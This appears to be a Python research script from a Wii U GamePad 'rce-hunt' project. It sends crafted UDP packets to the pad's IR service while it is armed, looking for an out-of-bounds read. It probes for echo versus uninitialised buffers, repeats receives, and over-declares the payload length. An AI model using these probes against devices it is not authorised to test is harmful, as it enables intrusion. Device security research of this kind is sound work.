#!/usr/bin/env python3
"""Deep IR probes — run while the pad is ARMED (state index 0).

Context: the pad's `ir` manager answers nothing but error 9004 until the console's
command-plane arming burst has been replayed (`run/command-plane.py --mode full`,
which flipped the pad's state index 12 -> 0 on 2026-11-04 10:44). With the pad
armed, the same methods answer, and `svc 5/0x11` opcode `02` (receive) returns a
**520-byte** body — the largest attacker-readable reply the pad offers.

What this script establishes, in order:
  A. echo vs uninitialised: send a known 520-byte pattern with opcode 01 (send),
     then opcode 02 (receive). If the reply contains our pattern it is an echo
     buffer (benign); if it is 0xff / stale it is an uninitialised or stale buffer.
  B. stability: repeat the bare receive 3x; identical bytes => fixed fill, varying
     => memory from the surrounding object.
  C. over-claim (the real test): deliver 20 bytes but declare 520 / 1028 / 0xFFFF.
     If the reply length or content tracks the declaration, the handler trusts the
     wire length and we have an OOB read window.
  D. TV5: `svc 5/0x17` with the pad's real remocon ID `T0156` (from its UIC EEPROM).

Nothing persistent is sent: no 5/0x18, no 5/0x0c, no 5/0x02, no svc 0 0x02-0x05/0x0b-0x0f.

Usage:
  sudo research/rce-hunt/ir-deep.py --out out/evidence/rce-ir-deep
"""
from __future__ import annotations

import argparse
import json
import os
import socket
import struct
import sys
import time

PAD = ("192.168.1.11", 50123)
IFACE = "WiiUAP"


def gen(svc: int, method: int, payload: bytes = b"", declared: int | None = None,
        flags: int = 0x40) -> bytes:
    declared = len(payload) if declared is None else declared
    gen_h = bytes([0x7E, 0x01, 0x00, 0x08, 0x00, flags, svc, method,
                   0x00, 0x00, (declared >> 8) & 0xFF, declared & 0xFF])
    return struct.pack("<HHHH", 0, 0, 12 + len(payload), 0) + gen_h + payload


class Sniffer:
    def __init__(self) -> None:
        self.s = socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM,
                               socket.htons(0x0800))
        self.s.bind((IFACE, 0))
        self.s.setblocking(False)
        self.tx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.tx.bind(("0.0.0.0", 0))

    def ask(self, pkt: bytes, seq: int, wait: float = 1.0) -> dict | None:
        pkt = bytearray(pkt)
        pkt[6:8] = struct.pack("<H", seq & 0xFFFF)
        self.tx.sendto(bytes(pkt), PAD)
        end = time.time() + wait
        while time.time() < end:
            try:
                f = self.s.recv(65535)
            except BlockingIOError:
                time.sleep(0.01)
                continue
            ihl = (f[0] & 0x0F) * 4
            if f[9] != 17:
                continue
            u = f[ihl:]
            sp, dp, ul = struct.unpack_from(">HHH", u, 0)
            if dp != 50023 or sp != 50123:
                continue
            p = u[8:ul]
            if len(p) < 20 or p[8] != 0x7E:
                continue
            pt, qt, pl, sq = struct.unpack_from("<HHHH", p, 0)
            if pt != 2 or sq != (seq & 0xFFFF):
                continue
            err = struct.unpack_from(">H", p, 16)[0]
            bl = struct.unpack_from(">H", p, 18)[0]
            return {"error": err, "len": bl, "body": p[20:20 + bl]}
        return None


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", default=None)
    args = ap.parse_args()
    sn = Sniffer()
    rows: list[dict] = []
    seq = 0x7100

    def step(name: str, svc: int, method: int, payload: bytes = b"",
             declared: int | None = None, wait: float = 1.0) -> dict | None:
        nonlocal seq
        seq += 1
        r = sn.ask(gen(svc, method, payload, declared), seq, wait)
        rec = {"case": name, "svc": svc, "method": method,
               "sent_len": len(payload), "declared": len(payload) if declared is None else declared,
               "sent": payload.hex()[:64],
               "error": None if r is None else r["error"],
               "rx_len": None if r is None else r["len"],
               "rx": None if r is None else r["body"][:96].hex(),
               "rx_sha": None if r is None else __import__("hashlib").sha256(r["body"]).hexdigest()[:16],
               "distinct": None if r is None else len(set(r["body"]))}
        rows.append(rec)
        print(f"{name:34s} err={rec['error']} len={rec['rx_len']} "
              f"distinct_bytes={rec['distinct']} {rec['rx'][:64] if rec['rx'] else ''}")
        time.sleep(0.15)
        return r

    print("== A. is the IR receive buffer an echo or uninitialised?")
    step("A0.state", 4, 0x05)
    pat = bytes([0xAA]) * 519
    step("A1.send_520xAA", 5, 0x11, b"\x01" + pat)
    r = step("A2.recv_after_send", 5, 0x11, b"\x02")
    if r:
        print(f"   echo? first16={r['body'][:16].hex()} all_AA={set(r['body']) == {0xAA}} "
              f"all_FF={set(r['body']) == {0xFF}}")

    print("\n== B. stability of the bare receive")
    bodies = []
    for i in range(3):
        step(f"B{i}.recv_bare", 5, 0x11, b"\x02")
    print("\n== C. over-claim: deliver 20 B, declare more")
    for declared in (64, 255, 520, 1028, 0xFFFF):
        step(f"C.declare{declared}", 5, 0x11, b"\x01" + bytes(19), declared)
    step("C0.recv_after_overclaim", 5, 0x11, b"\x02")
    step("C1.send_520_pattern_then_recv_hint", 5, 0x11, b"\x01" + bytes([0x5A]) * 519)

    print("\n== D. TV5 remocon ID (real ID from the pad's own EEPROM)")
    step("D1.tvcmd_T0156", 5, 0x17, b"T0156" + b"\x00\x00")
    step("D2.tvcmd_ffff", 5, 0x17, b"\xff" * 5 + b"\x00\x00")
    step("D3.misc_ff", 5, 0x16, b"\xff")
    step("D4.state_after", 4, 0x05)

    if args.out:
        os.makedirs(args.out, exist_ok=True)
        with open(os.path.join(args.out, "ir-deep.json"), "w") as fh:
            json.dump({"when": time.ctime(), "rows": rows}, fh, indent=1)
        print(f"\n# evidence in {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
